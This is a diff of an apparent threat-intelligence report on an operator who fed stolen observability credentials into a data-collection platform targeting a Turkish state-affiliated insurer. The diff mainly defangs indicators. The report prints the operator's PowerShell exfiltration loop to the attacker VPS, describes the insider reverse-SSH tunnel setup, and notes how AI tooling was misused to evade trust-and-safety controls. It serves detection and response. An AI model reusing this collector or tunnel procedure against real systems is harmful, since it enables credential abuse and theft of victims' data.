@@ -25,7 +25,7 @@ detection_sections:
   - label: "Suricata Signatures"
     anchor: "#suricata-signatures"
 ioc_highlights:
-  - "209.38.205.158"
+  - "209[.]38[.]205[.]158"
   - "ee5428e9b47fd102d27d3dcc804b10512100acd21399969efe39e201e61cbf79"
   - "65d2eb26067c3df4b139b02145bdba2065be5a403f38ad096f886230b41fda9b"
   - "9928277dbbfbdf95a5f4e98ef99e55b7d87093982dbdd298be16b232bfc39c77"
@@ -46,7 +46,7 @@ figure_nav:
         anchor: "#arpa-korelasyon-motoru-platform-architecture"
 ---
 
-**Campaign Identifier:** Turkish-ARPA-OpenClaw-State-Insurer-UTA-2026-013-209.38.205.158<br>
+**Campaign Identifier:** Turkish-ARPA-OpenClaw-State-Insurer-UTA-2026-013-209[.]38[.]205[.]158<br>
 **Last Updated:** May 27, 2026<br>
 **Threat Level:** CRITICAL
 
@@ -62,7 +62,7 @@ figure_nav:
 {: .hl-tier-1}
 {: .hl-tab-overview}
 
-A Turkish-speaking operator is actively running a custom intelligence-collection platform against a **state-affiliated Turkish financial-sector victim**, built entirely on stolen monitoring credentials. The operator weaponized the OpenClaw AI agent framework into a self-branded analytics platform, `ARPA Korelasyon Motoru` ("ARPA Correlation Engine"), that cross-correlates **four stolen enterprise observability sources** (IBM Instana, SolarWinds Orion, Zabbix, VMware Aria) into a single 7,552-element view of the victim's internal infrastructure, and recruited a named in-network insider via operator-authored Turkish-language reverse-SSH-tunnel documentation. Every dimension is documented from primary-source artifacts pulled directly from the operator's open-directory-exposed VPS at `209.38.205.158` (DigitalOcean Frankfurt, AS14061), not from downstream effects. This is an **active, named-victim, insider-in-chain** compromise: the credential-rotation timeline is the remediation timeline, and it is currently running.
+A Turkish-speaking operator is actively running a custom intelligence-collection platform against a **state-affiliated Turkish financial-sector victim**, built entirely on stolen monitoring credentials. The operator weaponized the OpenClaw AI agent framework into a self-branded analytics platform, `ARPA Korelasyon Motoru` ("ARPA Correlation Engine"), that cross-correlates **four stolen enterprise observability sources** (IBM Instana, SolarWinds Orion, Zabbix, VMware Aria) into a single 7,552-element view of the victim's internal infrastructure, and recruited a named in-network insider via operator-authored Turkish-language reverse-SSH-tunnel documentation. Every dimension is documented from primary-source artifacts pulled directly from the operator's open-directory-exposed VPS at `209[.]38[.]205[.]158` (DigitalOcean Frankfurt, AS14061), not from downstream effects. This is an **active, named-victim, insider-in-chain** compromise: the credential-rotation timeline is the remediation timeline, and it is currently running.
 
 What is new about this case is the convergence: no public reporting documents a sustained four-source observability reverse-pipeline cross-correlated against a single named state-affiliated victim, paired with an operator-recruited insider surfaced by third-party detection before the victim's own. For cross-case campaign context, see the parent report (linked above); this sub-report owns the operator-specific forensic depth.
 
@@ -123,8 +123,8 @@ This is a **single-operator** case tracked as **<a href="/actors/UTA-2026-013/">
 Full detection-coverage map and response orientation are in §10 and the linked detection file. The highest-signal starting points:
 
 - **Detection:** the multi-platform cross-source authentication pattern (same source IP against ≥2 observability platforms in a short window) is the diagnostic signature of the Observability-Tool Reverse Pipeline TTP, `Sigma rule 7` + `Suricata rule 2`. Operator self-branding string `ARPA Korelasyon Motoru` is a near-zero-FP YARA detection (`YARA rule 1`).
-- **Hunt:** `/opt/ARPA/` filesystem tree; co-located `~/.openclaw/` + `~/.clawdbot/` (discriminator from legitimate OpenClaw dev environments); `arpa-*.service` unit files; the stolen JWT's jti (withheld; the victim holds it) in any artifact; PowerShell `Invoke-RestMethod -SkipCertificateCheck` against `ocpinstana.[victim-domain].com.tr`.
-- **Victim mitigation:** rotate all four observability credential sources in parallel; segregate and forensically review the named insider account; block egress to `209.38.205.158` ports 22, 8089, 8090, 8095, 8096.
+- **Hunt:** `/opt/ARPA/` filesystem tree; co-located `~/.openclaw/` + `~/.clawdbot/` (discriminator from legitimate OpenClaw dev environments); `arpa-*.service` unit files; the stolen JWT's jti (withheld; the victim holds it) in any artifact; PowerShell `Invoke-RestMethod -SkipCertificateCheck` against `ocpinstana[.][victim-domain][.]com[.]tr`.
+- **Victim mitigation:** rotate all four observability credential sources in parallel; segregate and forensically review the named insider account; block egress to `209[.]38[.]205[.]158` ports 22, 8089, 8090, 8095, 8096.
 - **Broader-customer governance:** audit long-lived monitoring API tokens (`Sigma rule 6` matches audit events that carry the stolen token's `jti` or reach the victim tenant from outside the private ranges, and reads no expiry field, so token lifetime has to be audited separately); review audit logs for any source-IP authenticating against multiple observability platforms from outside the admin allow-list.
 
 For executives reading only this section: the ARPA platform is a textbook case of **stolen monitoring credentials weaponized as intelligence-collection infrastructure against the victim itself**. The takeaway is not "block AI" or "block observability" (both are legitimate tools) but **treat monitoring-platform credentials as crown-jewel-class secrets with admin-token-grade rotation and source-IP allow-listing**.
@@ -153,7 +153,7 @@ Credential rotation across all four platforms leads the work; insider account se
 
 - **Phase 1: Credential rotation across all four platforms.** Rotate Instana, SolarWinds Orion, Zabbix, and VMware Aria credentials in parallel; sequential rotation gives the operator a window to re-establish access via the not-yet-rotated platform.
 - **Phase 2: Insider account segregation and forensic review.** Segregate the named Windows AD account, forensically image the workstation (memory + disk + browser + SSH client artifacts), and assess intent classification. Coordinate through General Counsel and HR, not operational SOC channels, given the insider-in-chain risk and legal-evidentiary requirements.
-- **Phase 3: Reverse-SSH tunnel disruption.** Block outbound SSH to `209.38.205.158:22`; audit internal SSH client configs for the `ARPA_Tunnel` saved session and `rca_key.ppk` / `rca_key.pem`; remove operator-supplied keys wherever they appear.
+- **Phase 3: Reverse-SSH tunnel disruption.** Block outbound SSH to `209[.]38[.]205[.]158:22`; audit internal SSH client configs for the `ARPA_Tunnel` saved session and `rca_key.ppk` / `rca_key.pem`; remove operator-supplied keys wherever they appear.
 - **Phase 4: Forensic enumeration of operator-accessed scope.** Reconstruct the operator's access pattern across all four platforms (endpoints, time windows, data volumes), the unified-topology state, and the sanctions-exposed-partner deep-dive scope. Requires direct access to each platform's audit log.
 - **Phase 5: Partner-ecosystem notification.** Notify the six partner entities and one subsidiary that they appear as integration endpoints in the operator-accessed topology. Sequence after victim-side rotation completes.
 - **Phase 6: Monitoring credential governance audit.** Audit token lifetime (rotate any token with `exp ≥ 1 year`), source-IP allow-listing, and provisioning (verify no token was issued outside the documented admin operator).
@@ -207,7 +207,7 @@ The ARPA platform is operator-built custom tooling, not a commodity malware fami
 
 ### File and Component Identifiers
 
-Twelve operator-authored Python modules form the core of the ARPA platform and anchor the IOC feed at DEFINITE confidence. The feed carries 13 SHA256 file hashes in total: those 12 modules plus 1 MODERATE-confidence ecosystem-template file (`SOUL.md`, a default Hermes/OpenClaw persona file present across developer environments, see feed for false-positive guidance), drawn from the roughly 780 artifacts in the operator's open directory. Hash inventory and per-file context are in the structured IOC feed at `/ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json`. The highest-confidence file artifacts are:
+Twelve operator-authored Python modules form the core of the ARPA platform and anchor the IOC feed at DEFINITE confidence. The feed carries 13 SHA256 file hashes in total: those 12 modules plus 1 MODERATE-confidence ecosystem-template file (`SOUL.md`, a default Hermes/OpenClaw persona file present across developer environments, see feed for false-positive guidance), drawn from the roughly 780 artifacts in the operator's open directory. Hash inventory and per-file context are in the structured IOC feed at `/ioc-feeds/turkish-arpa-openclaw-state-insurer-209[.]38[.]205[.]158-iocs.json`. The highest-confidence file artifacts are:
 
 - `topology_mapper.py`: Instana topology collector (Turkish docstring + hardcoded JWT)
 - `instana_collector_v4.py`: event collector iteration v4 (same JWT)
@@ -250,7 +250,7 @@ The net classification is **Advanced operator with selectively sophisticated pla
 
 #### Deep Technical Analysis
 
-The ARPA platform is deployed at `/opt/ARPA/` on the operator VPS `209.38.205.158` (DigitalOcean Frankfurt, AS14061). An earlier project path `/opt/rca-platform/` is preserved on the same host (operator naming-history artifact). Five systemd unit files coordinate the daemons:
+The ARPA platform is deployed at `/opt/ARPA/` on the operator VPS `209[.]38[.]205[.]158` (DigitalOcean Frankfurt, AS14061). An earlier project path `/opt/rca-platform/` is preserved on the same host (operator naming-history artifact). Five systemd unit files coordinate the daemons:
 
 | Systemd unit | Role |
 |---|---|
@@ -290,7 +290,7 @@ To detect it, see `Sigma rule 7` and `Suricata rule 2` in the linked detection f
 > **Analyst note:** This subsection covers the campaign's headline novel TTP. The operator did not steal one observability credential, the operator stole **four**, all from the same victim, and built a sustained ETL pipeline cross-correlating data across all four. The closest documented adjacent case (UNC6395 OAuth-based CRM breach against Salesforce in 2025) is structurally distinct: that case was one-time exfiltration affecting many tenants; this case is sustained ETL against a single named tenant. The SolarWinds Sunburst case is **not** comparable. Sunburst was a supply-chain compromise against the vendor's update infrastructure, not a stolen-credential reverse pipeline against the vendor's customer. After full prior-art review (Tier-1 vendor reports + Tier-2 vendor catalogs through 2024-2026), novelty is maintained at the top of the MODERATE band.
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img src="{{ "/assets/images/turkish-arpa-openclaw-state-insurer-209.38.205.158/arpa-observability-reverse-pipeline.svg" | relative_url }}" alt="Hybrid infographic showing the Observability-Tool Reverse Pipeline TTP. Four stolen credential source cards are arranged in a 2×2 grid at the top, each with a yellow side-rail. Top-left: IBM Instana, 10-year JWT (issued 2024-03-06, expires approximately 2034-02), JWT ID [withheld], tenant [victim-tenant], endpoint ocpinstana.[victim-domain].com.tr, used by the operator for 73+ days continuous polling. Top-right: SolarWinds Orion, stolen service-account credential capturing 784 nodes and 6,566 interfaces in the snapshot solarwinds_topology_20260312_1015.json (NOT Sunburst, stolen-credential abuse against the vendor's customer, not supply-chain compromise against the vendor). Bottom-left: Zabbix, stolen admin or read-only token capturing 100 victim hosts in zabbix_topology_20260312_2058.json (token held in environment variables, not in the open-directory capture). Bottom-right: VMware Aria, vCenter and ESXi monitoring API access capturing 8,649 events spanning three internal-domain spaces (production AD, Linux estate, and a VMware-managed cluster; specific names suppressed). Convergence arrows from all four source cards point down into a single ARPA platform card with a red side-rail and deep-red border (the operator-built cross-source ETL): ARPA Korelasyon Motoru, a Python + TimescaleDB + Neo4j + Redis platform running 5 systemd daemons (arpa-autolearn, arpa-continuous, arpa-daemon, arpa-instana-api, arpa-parallel) with a 5-minute polling cadence and a cross-source correlation layer linking Instana service-IDs to SolarWinds node-IDs to Zabbix host-IDs to VMware Aria VM-IDs, plus an AI-augmented natural-language query interface (ai_service.py + ai_assistant.db) flagged as a CANDIDATE novel TTP at N=1. The ARPA platform sits on operator-OWNED DigitalOcean infrastructure at 209.38.205.158 (Frankfurt), alive at investigation date 2026-05-24. A connector arrow continues down to an outcome card with a deep-red side-rail (endgame): a 7,552-element unified topology graph of the victim organization's internal infrastructure with 1,859 hosts cross-correlated and partner-ecosystem visibility across several regulated-sector partners (two state banks, a pension-fund operator, and three insurance-sector regulators) and the victim subsidiary. The outcome card emphasizes that the operator's view is comparable to a privileged internal admin without ever compromising a single victim endpoint, and that the credential-rotation timeline IS the remediation timeline. Footer detection anchor: multi-platform cross-source authentication from the same source IP within a short window is diagnostic for the TTP class (Sigma rule 7 + Suricata rule 2 in the linked detection file).">
+  <img src="{{ "/assets/images/turkish-arpa-openclaw-state-insurer-209.38.205.158/arpa-observability-reverse-pipeline.svg" | relative_url }}" alt="Hybrid infographic showing the Observability-Tool Reverse Pipeline TTP. Four stolen credential source cards are arranged in a 2×2 grid at the top, each with a yellow side-rail. Top-left: IBM Instana, 10-year JWT (issued 2024-03-06, expires approximately 2034-02), JWT ID [withheld], tenant [victim-tenant], endpoint ocpinstana[.][victim-domain][.]com[.]tr, used by the operator for 73+ days continuous polling. Top-right: SolarWinds Orion, stolen service-account credential capturing 784 nodes and 6,566 interfaces in the snapshot solarwinds_topology_20260312_1015.json (NOT Sunburst, stolen-credential abuse against the vendor's customer, not supply-chain compromise against the vendor). Bottom-left: Zabbix, stolen admin or read-only token capturing 100 victim hosts in zabbix_topology_20260312_2058.json (token held in environment variables, not in the open-directory capture). Bottom-right: VMware Aria, vCenter and ESXi monitoring API access capturing 8,649 events spanning three internal-domain spaces (production AD, Linux estate, and a VMware-managed cluster; specific names suppressed). Convergence arrows from all four source cards point down into a single ARPA platform card with a red side-rail and deep-red border (the operator-built cross-source ETL): ARPA Korelasyon Motoru, a Python + TimescaleDB + Neo4j + Redis platform running 5 systemd daemons (arpa-autolearn, arpa-continuous, arpa-daemon, arpa-instana-api, arpa-parallel) with a 5-minute polling cadence and a cross-source correlation layer linking Instana service-IDs to SolarWinds node-IDs to Zabbix host-IDs to VMware Aria VM-IDs, plus an AI-augmented natural-language query interface (ai_service.py + ai_assistant.db) flagged as a CANDIDATE novel TTP at N=1. The ARPA platform sits on operator-OWNED DigitalOcean infrastructure at 209[.]38[.]205[.]158 (Frankfurt), alive at investigation date 2026-05-24. A connector arrow continues down to an outcome card with a deep-red side-rail (endgame): a 7,552-element unified topology graph of the victim organization's internal infrastructure with 1,859 hosts cross-correlated and partner-ecosystem visibility across several regulated-sector partners (two state banks, a pension-fund operator, and three insurance-sector regulators) and the victim subsidiary. The outcome card emphasizes that the operator's view is comparable to a privileged internal admin without ever compromising a single victim endpoint, and that the credential-rotation timeline IS the remediation timeline. Footer detection anchor: multi-platform cross-source authentication from the same source IP within a short window is diagnostic for the TTP class (Sigma rule 7 + Suricata rule 2 in the linked detection file).">
   <figcaption><em>Figure 1: Observability-Tool Reverse Pipeline, the headline novel TTP for Case 2 visualized. Four stolen monitoring credentials (IBM Instana 10-year JWT, SolarWinds Orion service account, Zabbix admin token, VMware Aria API access) converge into the operator's ARPA cross-source ETL platform, producing a 7,552-element unified topology graph of the victim organization's internal infrastructure with partner-ecosystem visibility. The TTP class is diagnostic via multi-platform cross-source authentication detection (Sigma rule 7 + Suricata rule 2), defenders should treat monitoring-platform credentials as crown-jewel-class secrets.</em></figcaption>
 </figure>
 
@@ -308,9 +308,9 @@ The captured JWT carries:
 | `tenant` | `[victim-tenant]` | Victim identification anchor |
 | `iat` (issued at) | 2024-03-06 | Token issuance date |
 | `exp` (expiration) | approximately 2034-02 | 10-year token lifetime, the credential governance defect |
-| Endpoint | `ocpinstana.[victim-domain].com.tr` | Victim's IBM-hosted OCP Instana tenant URL |
+| Endpoint | `ocpinstana[.][victim-domain][.]com[.]tr` | Victim's IBM-hosted OCP Instana tenant URL |
 
-Operator usage pattern (from `topology_mapper.py` and `instana_collector_v4.py`): HTTP GET against `https://ocpinstana.[victim-domain].com.tr/api/applications` with `Authorization: apiToken <REDACTED-JWT>` header, plus polling against `/api/events?from=<TS>&to=<TS>&limit=100` in a sliding-window pattern. PowerShell collector version (`turkish-instana_local_collector.ps1`) uses `Invoke-RestMethod -SkipCertificateCheck`. The TLS validation skip is consistent with an insider-deployed script targeting an internal endpoint (MODERATE-confidence interpretation: two plausible drivers are a self-signed internal certificate chain or operational concealment by suppressing TLS-validation-failure audit-log signals; both interpretations align with the script's insider-execution profile).
+Operator usage pattern (from `topology_mapper.py` and `instana_collector_v4.py`): HTTP GET against `hxxps://ocpinstana[.][victim-domain][.]com[.]tr/api/applications` with `Authorization: apiToken <REDACTED-JWT>` header, plus polling against `/api/events?from=<TS>&to=<TS>&limit=100` in a sliding-window pattern. PowerShell collector version (`turkish-instana_local_collector.ps1`) uses `Invoke-RestMethod -SkipCertificateCheck`. The TLS validation skip is consistent with an insider-deployed script targeting an internal endpoint (MODERATE-confidence interpretation: two plausible drivers are a self-signed internal certificate chain or operational concealment by suppressing TLS-validation-failure audit-log signals; both interpretations align with the script's insider-execution profile).
 
 The 10-year JWT lifetime is the central credential governance defect. IBM Instana does not enforce a maximum token lifetime by default; the customer (the victim organization in this case) is responsible for setting rotation policy. The captured JWT was issued in March 2024 and the operator obtained it at some unknown point between then and the campaign's first observed activity (March 2026). The token has not been rotated despite the operator using it continuously for 73+ days of documented activity. This is a customer-side governance failure, **not** an IBM Instana product CVE.
 
@@ -383,7 +383,7 @@ Document filenames (visible in operator filesystem):
 Tunnel architecture (documented in PUTTY_TUNNEL_DETAY.md):
 
 ```
-Operator VPS (209.38.205.158) ─── port 18080 (operator-side) ──┐
+Operator VPS (209[.]38[.]205[.]158) ─── port 18080 (operator-side) ──┐
                                                                 ├── reverse-SSH tunnel
 Insider Windows workstation ───── localhost:8089 ──────────────┘
 PuTTY saved session: "ARPA_Tunnel"
@@ -409,7 +409,7 @@ The insider's intent, whether cooperative, coerced, deceived, or a compromised a
 
 Determining which scenario applies requires victim-side forensic access, interviewing the named user, reviewing their workstation forensic state, reviewing their email and chat history for operator contact, and verifying whether they recognize the PuTTY session name or the SSH keys. This investigation must be handled with appropriate legal/HR coordination given the insider-in-chain sensitivity.
 
-To detect it, see `Sigma rule 9`, covering Markdown files with the Turkish-language tunnel-setup naming convention in user-profile directories, and `Sigma rule 10`, covering a PuTTY saved session named `ARPA_Tunnel` or SSH outbound to `209.38.205.158:22`, both in the linked detection file.
+To detect it, see `Sigma rule 9`, covering Markdown files with the Turkish-language tunnel-setup naming convention in user-profile directories, and `Sigma rule 10`, covering a PuTTY saved session named `ARPA_Tunnel` or SSH outbound to `209[.]38[.]205[.]158:22`, both in the linked detection file.
 
 The structural rarity is confirmed. I reviewed the 2024-2026 published corpus on insider threats and found no case combining all four structural factors of this finding, third-party detection first, a single specific state-affiliated corporate victim, a named individual insider identifiable from operator artifacts, and a 70+ day victim-awareness gap. Rippling/Deel (2025), Coinbase (2025) and other insider-threat reference cases are internal-detection-first events with comparable insider dimensions, but they lack the third-party-first detection structural rarity. This finding is publication-defining.
 
@@ -508,13 +508,13 @@ The partner targeting is selective. The disproportionate deep-dive into one part
 
 | Infrastructure | Provider / Detail | Role |
 |---|---|---|
-| Operator VPS | `209.38.205.158` on DigitalOcean Frankfurt (AS14061) | ARPA platform host; 5 systemd daemons; 4 data persistence backends; HTTP services on ports 8090 (dashboard), 8095 (unified-topology API), 8096 (Instana ingestion API), 8089 (reverse-SSH tunnel target) |
+| Operator VPS | `209[.]38[.]205[.]158` on DigitalOcean Frankfurt (AS14061) | ARPA platform host; 5 systemd daemons; 4 data persistence backends; HTTP services on ports 8090 (dashboard), 8095 (unified-topology API), 8096 (Instana ingestion API), 8089 (reverse-SSH tunnel target) |
 | Operator source IP | TurkNet AS12735 (Turkish residential / SMB ISP, Istanbul area), specific IP suppressed from public report body | Operator's interactive source captured during active session 2026-05-20 21:22-21:30 UTC = late-evening Turkish local time |
 | LLM provider | Moonshot AI / Kimi | Chinese-jurisdiction LLM provider chosen over Western LLMs (Anthropic, OpenAI, Google), Trust-and-Safety-evasion tradecraft |
 | GitHub repository | Operator-controlled public GitHub repository (URL suppressed from public report body per operational-sensitivity protocol) | Public repository hosting ARPA-related code; **account suspended by GitHub T&S 2026-05-25**, repository no longer accessible |
 | AI agent platform | OpenClaw | Chinese commercial AI agent CLI; substrate for the ARPA platform's AI service layer |
 
-DigitalOcean Frankfurt was likely selected for low-latency access from Istanbul (~40-60 ms RTT to Frankfurt) rather than for abuse tolerance. DigitalOcean is a legitimate Tier-1 commercial cloud provider with a cooperative abuse desk and published transparency reports. Takedown of `209.38.205.158` is administratively feasible via DigitalOcean's abuse desk.
+DigitalOcean Frankfurt was likely selected for low-latency access from Istanbul (~40-60 ms RTT to Frankfurt) rather than for abuse tolerance. DigitalOcean is a legitimate Tier-1 commercial cloud provider with a cooperative abuse desk and published transparency reports. Takedown of `209[.]38[.]205[.]158` is administratively feasible via DigitalOcean's abuse desk.
 
 TurkNet was likely the operator's home or workplace ISP rather than a deliberate jurisdictional choice. The lack of VPN / Tor masking is consistent with either OPSEC failure or non-professional individual operator pattern; subscriber-record disclosure via Turkish law enforcement (SECRD Cybercrime Combat Department) subpoena to TurkNet is operationally feasible if Turkish LE is engaged via USOM. The 2025 TurkNet breach disclosure (2.8M records affected) creates a separate question about subscriber-record evidentiary integrity that is unresolved at investigation date.
 
@@ -554,7 +554,7 @@ The Turkish header comment is itself an attribution-anchor signal, operator-auth
 
 ```powershell
 $apiToken = "<REDACTED-JWT>"  # tenant=[victim-tenant], jti=[withheld]
-$instanaUrl = "https://ocpinstana.[victim-domain].com.tr"
+$instanaUrl = "hxxps://ocpinstana[.][victim-domain][.]com[.]tr"
 $headers = @{ "Authorization" = "apiToken $apiToken" }
 ```
 
@@ -563,11 +563,11 @@ The stolen 10-year JWT is hardcoded into the PowerShell script. The `Authorizati
 **Polling loop:**
 
 ```powershell
-while ($true) {
+[w]hile ($true) {
     $events = Invoke-RestMethod -Uri "$instanaUrl/api/events?from=$fromTs&to=$toTs&limit=100" `
                                 -Headers $headers `
                                 -SkipCertificateCheck
-    Invoke-RestMethod -Uri "http://209.38.205.158:8096/api/ingest/instana" `
+    Invoke-RestMethod -Uri "hxxp://209[.]38[.]205[.]158:8096/api/ingest/instana" `
                       -Method POST `
                       -Body ($events | ConvertTo-Json -Depth 10) `
                       -ContentType "application/json"
@@ -577,8 +577,8 @@ while ($true) {
 
 Three operationally significant observations:
 
-1. **TLS validation skip (`-SkipCertificateCheck`).** Used when calling the victim's own Instana endpoint. The skip reduces risk-of-failure indicators in audit logs if the victim's internal certificate chain is unstable, but it is also a tell. Legitimate the victim organization administrative PowerShell would normally validate the chain. Detection rule: PowerShell `Invoke-RestMethod` with `-SkipCertificateCheck` AND URL containing `ocpinstana.[victim-domain].com.tr` is a near-zero-FP signature (Sigma rule in linked detection file).
-2. **Cleartext HTTP egress to operator VPS.** The collector POSTs harvested events to `http://209.38.205.158:8096/api/ingest/instana` over **cleartext HTTP**, not HTTPS. This is a deliberate operator architectural choice (the ingestion endpoint is unauthenticated and uses HTTP-only; covered in dynamic analysis Section 6) and is detectable at the network egress layer.
+1. **TLS validation skip (`-SkipCertificateCheck`).** Used when calling the victim's own Instana endpoint. The skip reduces risk-of-failure indicators in audit logs if the victim's internal certificate chain is unstable, but it is also a tell. Legitimate the victim organization administrative PowerShell would normally validate the chain. Detection rule: PowerShell `Invoke-RestMethod` with `-SkipCertificateCheck` AND URL containing `ocpinstana[.][victim-domain][.]com[.]tr` is a near-zero-FP signature (Sigma rule in linked detection file).
+2. **Cleartext HTTP egress to operator VPS.** The collector POSTs harvested events to `hxxp://209[.]38[.]205[.]158:8096/api/ingest/instana` over **cleartext HTTP**, not HTTPS. This is a deliberate operator architectural choice (the ingestion endpoint is unauthenticated and uses HTTP-only; covered in dynamic analysis Section 6) and is detectable at the network egress layer.
 3. **5-minute polling cadence (`Start-Sleep -Seconds 300`).** Aligns with the operator-side 5-minute systemd daemon polling cadence. The combined effect is that observability data flows from victim → operator with at most 5 minutes of staleness.
 
 ### 5.2 ARPA Platform Python Source Code
@@ -642,7 +642,7 @@ The same AI-generated-code structural signature appears in Case 1 ([Russian Gemi
 
 The eight Turkish-language Markdown operator notes are structurally documentation rather than code. Static walkthrough of the most operationally significant document (`PUTTY_TUNNEL_DETAY.md`):
 
-The document walks the insider through PuTTY tunnel setup in numbered Turkish-language steps: configure the SSH connection to `209.38.205.158:22`, load the saved session named `ARPA_Tunnel`, configure the reverse tunnel mapping port `18080` (remote) to `localhost:8089` (local), authenticate using the operator-supplied `rca_key.ppk` private key, and verify the tunnel is established by checking that traffic flows from operator → insider workstation localhost:8089.
+The document walks the insider through PuTTY tunnel setup in numbered Turkish-language steps: configure the SSH connection to `209[.]38[.]205[.]158:22`, load the saved session named `ARPA_Tunnel`, configure the reverse tunnel mapping port `18080` (remote) to `localhost:8089` (local), authenticate using the operator-supplied `rca_key.ppk` private key, and verify the tunnel is established by checking that traffic flows from operator → insider workstation localhost:8089.
 
 The document content is purely operational with no coercive language visible. The instructional register (numbered steps, screenshot annotations, troubleshooting tips) is consistent with operator-to-cooperating-insider documentation, but is also consistent with operator-to-deceived-insider (where the operator presents themselves as a legitimate vendor providing a "remote access tool" for compliance reasons). Insider intent classification cannot be determined from the documentation alone.
 
@@ -673,7 +673,7 @@ Through the first thirty seconds, four parallel HTTP requests go out from the op
 
 | Source | Endpoint | Authentication |
 |---|---|---|
-| Instana | `https://ocpinstana.[victim-domain].com.tr/api/events?from=<TS>&to=<TS>&limit=100` | `Authorization: apiToken <stolen-JWT>` |
+| Instana | `hxxps://ocpinstana[.][victim-domain][.]com[.]tr/api/events?from=<TS>&to=<TS>&limit=100` | `Authorization: apiToken <stolen-JWT>` |
 | SolarWinds Orion | Orion API endpoint (specific URL captured in operator code) | Stolen service-account credentials |
 | Zabbix | Zabbix API endpoint | Stolen admin or read-only credential |
 | VMware Aria | Aria vCenter / ESXi monitoring endpoint | Stolen credential |
@@ -698,14 +698,14 @@ Sequence:
 
 1. Insider opens PuTTY on Windows workstation.
 2. Insider loads the saved PuTTY session named `ARPA_Tunnel`.
-3. The session is pre-configured to connect to `209.38.205.158:22` with reverse tunnel mapping port 18080 (operator-side) to localhost:8089 (insider-side) and to authenticate using the operator-supplied private key `rca_key.ppk`.
-4. PuTTY initiates an outbound TCP connection to `209.38.205.158:22` (SSH).
-5. SSH session is established; the reverse tunnel is registered server-side on `209.38.205.158:18080`.
+3. The session is pre-configured to connect to `209[.]38[.]205[.]158:22` with reverse tunnel mapping port 18080 (operator-side) to localhost:8089 (insider-side) and to authenticate using the operator-supplied private key `rca_key.ppk`.
+4. PuTTY initiates an outbound TCP connection to `209[.]38[.]205[.]158:22` (SSH).
+5. SSH session is established; the reverse tunnel is registered server-side on `209[.]38[.]205[.]158:18080`.
 6. Operator can now connect to `localhost:18080` on the operator VPS and the connection is forwarded over the SSH tunnel to `localhost:8089` on the insider's workstation.
 
 The tunnel persists for the lifetime of the PuTTY session. If the session drops, `TUNNEL_RESTART.md` provides the insider with restart procedures.
 
-Network signature observable from victim-side network monitoring: long-lived outbound TCP from internal Windows workstation to `209.38.205.158:22` with tunneled application traffic. Detection rule: Sysmon Event ID 3 (network connection) showing internal-to-external TCP to `209.38.205.158:22` with extended session duration is a high-signal indicator.
+Network signature observable from victim-side network monitoring: long-lived outbound TCP from internal Windows workstation to `209[.]38[.]205[.]158:22` with tunneled application traffic. Detection rule: Sysmon Event ID 3 (network connection) showing internal-to-external TCP to `209[.]38[.]205[.]158:22` with extended session duration is a high-signal indicator.
 
 ### 6.3 AI-Augmented Natural-Language Query Interface Behavior
 
@@ -723,7 +723,7 @@ The query history in `ai_assistant.db` is sparse at investigation time (consiste
 
 The operator's HTTP services on the open directory were observed externally during the investigation:
 
-- **Port 8090 (ARPA dashboard).** Returns HTML containing the operator self-branding footer "ARPA © 2026 the victim organization | Read-Only Compliance | Mock Data: ❌" plus the operator dashboard UI. Server header: `SimpleHTTP/0.6 Python/3.10.12` (consistent with Python `http.server.SimpleHTTPServer`). Detection signature: HTTP response from `209.38.205.158:8090` with the Python SimpleHTTP server header and the operator-branded body content (Suricata rule in linked detection file).
+- **Port 8090 (ARPA dashboard).** Returns HTML containing the operator self-branding footer "ARPA © 2026 the victim organization | Read-Only Compliance | Mock Data: ❌" plus the operator dashboard UI. Server header: `SimpleHTTP/0.6 Python/3.10.12` (consistent with Python `http.server.SimpleHTTPServer`). Detection signature: HTTP response from `209[.]38[.]205[.]158:8090` with the Python SimpleHTTP server header and the operator-branded body content (Suricata rule in linked detection file).
 - **Port 8095 (unified-topology API).** Returns JSON containing unified-topology graph extracts. Endpoint `/api/topology/unified` returns the cached unified-topology export.
 - **Port 8096 (Instana ingestion API).** Accepts POSTs from the insider PowerShell collector. Unauthenticated, no Authorization header required for ingestion.
 - **Port 8098 (code exposure).** Was open during early investigation phases (returning operator Python source code via directory listing); selectively closed approximately 2026-03-14 after Hunt.io indexing, but ports 8090 and 8095 remained open through 2026-05-23.
@@ -754,7 +754,7 @@ The full ATT&CK technique mapping for this case is maintained alongside the dete
 
 > **Analyst note:** The complete IOC set for this case is published as a machine-readable JSON feed for direct SIEM/EDR ingestion. It is not duplicated inline here. The highest-priority indicators are also surfaced in the IOC panel (fingerprint icon) on this page.
 
-The full IOC feed is at [`/ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json`](https://the-hunters-ledger.com/ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json), carrying every indicator for this case with type, confidence and recommended action.
+The full IOC feed is at [`/ioc-feeds/turkish-arpa-openclaw-state-insurer-209[.]38[.]205[.]158-iocs.json`](https://the-hunters-ledger.com/ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json), carrying every indicator for this case with type, confidence and recommended action.
 
 ---
 
@@ -783,7 +783,7 @@ This report is the **first public attribution** of this operator. Cross-vendor n
 | CrowdStrike | NONE |
 | Kaspersky | NONE |
 | Hunt.io threat-actor catalog | NONE, confirmed via Hunt MCP query during investigation |
-| VirusTotal threat-actor associations | NONE, `209.38.205.158` is 0/91 clean with zero related threat actors; operator residential IP is also 0/91 clean |
+| VirusTotal threat-actor associations | NONE, `209[.]38[.]205[.]158` is 0/91 clean with zero related threat actors; operator residential IP is also 0/91 clean |
 | MITRE ATT&CK Groups | NONE, no documented Turkish-government-aligned APT TTP-overlap (Sea Turtle / Teal Kurma / Marbled Dust have zero documented BFSI targeting and zero TTP overlap with this campaign) |
 
 **Publication-significance signal (not a confidence boost):** Sub-report 2 in this same parent series (Russian Gemini, <a href="/actors/UTA-2026-012/">UTA-2026-012</a>) received Trend Micro Tier-2 corroboration three days before disclosure, which upgraded its attribution from MODERATE 75% to MODERATE 83%. This sub-report (Turkish ARPA, <a href="/actors/UTA-2026-013/">UTA-2026-013</a>) has the opposite profile: zero prior public attribution exists. The absence of corroboration is a publication-significance signal (this is first-ever vendor attribution via UTA designation), **not** a confidence reduction relative to attribution-anchor evidence. Confidence remains at high-MODERATE 78% based on primary-source operator-filesystem evidence alone.
@@ -853,7 +853,7 @@ Current attribution confidence ceiling is **high-MODERATE 78% within MODERATE ba
 
